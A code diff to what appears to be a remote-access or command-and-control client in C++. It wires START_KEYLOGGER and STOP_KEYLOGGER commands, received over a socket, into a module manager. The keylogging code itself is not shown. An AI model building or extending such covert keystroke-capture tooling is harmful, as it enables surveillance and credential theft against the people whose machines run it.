@@ -204,13 +204,17 @@ CommandDispatcher::CommandResult CommandDispatcher::handleScreenshot(const Comma
 }
 
 CommandDispatcher::CommandResult CommandDispatcher::handleStartKeylogger(const CommandContext& context) {
-    (void)context; // Suppress unused parameter warning - placeholder implementation
     std::cout << "[Action] Starting keylogger module..." << std::endl;
     
     try {
-        // TODO: Integrate with keylogger module when migrated
-        std::cout << "[CommandDispatcher] Start keylogger command - module integration pending" << std::endl;
-        return CommandResult::SUCCESS;
+        // Delegate to the module system
+        if (m_moduleManager.canHandleCommand("START_KEYLOGGER")) {
+            bool success = m_moduleManager.executeCommand("START_KEYLOGGER", context.arguments, context.socket);
+            return success ? CommandResult::SUCCESS : CommandResult::MODULE_ERROR;
+        } else {
+            std::cout << "[CommandDispatcher] No keylogger module available" << std::endl;
+            return CommandResult::MODULE_ERROR;
+        }
         
     } catch (const std::exception& e) {
         std::cerr << "[Error] Exception in keylogger handling: " << e.what() << std::endl;
@@ -219,13 +223,17 @@ CommandDispatcher::CommandResult CommandDispatcher::handleStartKeylogger(const C
 }
 
 CommandDispatcher::CommandResult CommandDispatcher::handleStopKeylogger(const CommandContext& context) {
-    (void)context; // Suppress unused parameter warning - placeholder implementation
     std::cout << "[Action] Stopping keylogger..." << std::endl;
     
     try {
-        // TODO: Integrate with keylogger module when migrated
-        std::cout << "[CommandDispatcher] Stop keylogger command - module integration pending" << std::endl;
-        return CommandResult::SUCCESS;
+        // Delegate to the module system
+        if (m_moduleManager.canHandleCommand("STOP_KEYLOGGER")) {
+            bool success = m_moduleManager.executeCommand("STOP_KEYLOGGER", context.arguments, context.socket);
+            return success ? CommandResult::SUCCESS : CommandResult::MODULE_ERROR;
+        } else {
+            std::cout << "[CommandDispatcher] No keylogger module available" << std::endl;
+            return CommandResult::MODULE_ERROR;
+        }
         
     } catch (const std::exception& e) {
         std::cerr << "[Error] Exception in stopping keylogger: " << e.what() << std::endl;
